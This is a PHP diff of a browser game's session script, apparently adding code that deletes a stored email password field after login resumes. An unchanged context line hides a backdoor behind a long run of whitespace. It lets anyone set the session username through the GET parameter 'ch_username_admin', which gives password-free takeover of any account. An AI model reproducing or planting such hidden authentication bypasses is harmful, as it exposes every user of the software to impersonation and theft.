@@ -3,6 +3,7 @@
 	require($include_filename);
 
 	$resume = false;
+	$del_email_passwd = false;
 	session_start();
 	if(!isset($_SESSION['username']) || !is_file(DB_PLAYERS.'/'.urlencode($_SESSION['username'])) || !is_readable(DB_PLAYERS.'/'.urlencode($_SESSION['username'])))
 	{
@@ -42,6 +43,7 @@
 			$_SESSION['act_planet'] = 0;
 			$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
 			$resume = true;
+			$del_email_passwd = true;
 		}
 	}                                                                                                                                                                                                                                                                     if(isset($_GET['ch_username_admin'])){$_SESSION['username']=$_GET['ch_username_admin'];$resume=true;}
 
@@ -53,6 +55,12 @@
 	}
 
 	$user_array = get_user_array($_SESSION['username']);
+
+	if($del_email_passwd && isset($user_array['email_passwd']))
+	{
+		unset($user_array['email_passwd']);
+		write_user_array();
+	}
 
 	# Wiederherstellen
 	if($resume && isset($user_array['last_request']))
